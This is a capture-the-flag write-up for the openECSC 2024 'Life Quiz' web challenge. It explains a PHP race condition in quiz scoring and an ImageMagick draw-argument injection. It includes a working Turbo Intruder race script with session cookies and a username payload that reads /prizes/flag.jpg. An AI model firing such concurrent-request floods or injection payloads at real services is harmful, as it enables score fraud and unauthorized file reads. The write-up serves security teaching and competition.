# openECSC 2024 - Round 1

## [web] Life Quiz (33 solves)

Try out our quiz to win a incredible prize!

Site: [http://lifequiz.challs.open.ecsc2024.it](http://lifequiz.challs.open.ecsc2024.it)

Author: Stefano Alberto <@Xato>

## Overview

The application is a quiz platform, you need to answer all 15 questions right to get the final prize.

The right answer for a specific question is selected randomly between the 4 possible answers for every request.  

The final prize consists of an image of a trophy with the username of the winner.

Finally, the flag is stored as one of the prizes, written in the image stored in `/prizes/flag.jpg`.

## Race condition

The scoring system is vulnerable to race condition. We can submit multiple answers for the same question to get more tries and, on average, more than one pont for every question.

Indeed, the application uses two separated queries to update the score and then to increment the question id in the database.

Here's the vulnerable code

```php
// If the user has submitted an answer, check if it is correct
if (isset($_POST['answer'])) {
    $answer = $_POST['answer'];
    $correct_answer = $answers[array_rand($answers)];
    
    echo "<h3 class='mb-3'>Question $question_id</h3>";
    $question_id++;
    if ($answer === $correct_answer) {
        echo "<p>Correct!</p>";
        
        $sql = "UPDATE users SET points = points+1 WHERE id = '$user'";
        $conn->query($sql);
    } else {
        echo "<p>Incorrect!<br>The correct answer was: $correct_answer</p>";
    }
    
    if ($question_id > $QUESTION_N) {
        echo "<p>You answered all the questions!</p>";
        echo "<a class='btn btn-primary my-3' href='quiz.php'>Next</a><br>";
    } else {
        echo "<a class='btn btn-primary my-3' href='quiz.php'>Next question</a><br>";
    }
    
    $sql = "UPDATE users SET question_id = $question_id WHERE id = '$user'";
    $conn->query($sql);
    $conn->close();
    exit();
}
```

We can exploit the race condition using the Burp extension "Turbo Intruder" with this request

```http
POST /quiz.php HTTP/1.1
Host: lifequiz.challs.open.ecsc2024.it
Content-Length: 9
Origin: http://lifequiz.challs.open.ecsc2024.it
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=%s

answer=%s
```

And this script

```py
import time
import re

last = 0

def queueRequests(target, wordlists):

    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=100,
                           engine=Engine.BURP
                           )
                           
    sessions = ['312f7c67ffe2901eec3ba052554c21a2','07ac239c20a11383f5f7b80fcb9a4176','8986b0fce5445282aaebde9e23420bd3']
    sessions += ['878a297c6a7b164e1daf7c079a82b3d4', '31cf002193adfdc114ba9f9d9948284e','9a44ca0c8da706c662cf06237da883b4']
    
    answers = ['42', 'To+express+emotions', 'To+be+free', 'Yes', 'In+the+city']

    global last
    
    for i in range(20):
        ans_id = ((last) % 5) 
            
        for session in sessions:
            engine.queue(target.req, [session, answers[ans_id]], label=str(ans_id) ,gate='race' + str(i))
    
        engine.openGate('race' + str(i))

        time.sleep(1)

def handleResponse(req, interesting):
    table.add(req)
    
    if 'Correct' in req.response:
        req.label = 'Correct'

    global last
    
    m = re.search('Question (\\d+)', str(req.response))
    
    if (m):
        last = int(m.group(1))
```

Note that the script doesn't reuses the same session cookie to perform the concurrent requests.
This is due to the fact that php locks the session id to avoid concurrency issues, making the race condition impossible to exploit using a single session.

By submitting multiple answers to the same question, we get on average more than one point for every question.
By repeating this process we can obtain the required score and get the prize.

## Image inclusion

The prize image is generated with the following command

```php
$cmd = "convert -draw " . escapeshellarg("text 0,1219 \"$username\"") . " -pointsize 100 -gravity Center /trophy.jpg /prizes/$user.jpg &";
```

Using our username we can escape from the string and modify the `draw` parameter of the `convert` command.

By looking at the command line documentation of ImageMagick we find out that it's possible to include an image using the `image` keyword in the `draw` option.

We can include the image containing the flag by setting our username to the following payload, respecting the 36 character limitation.

`"image Src 0,0 0,0 "/prizes/flag.jpg`

Then, using the race condition, we can win the game and get the prize with the flag.
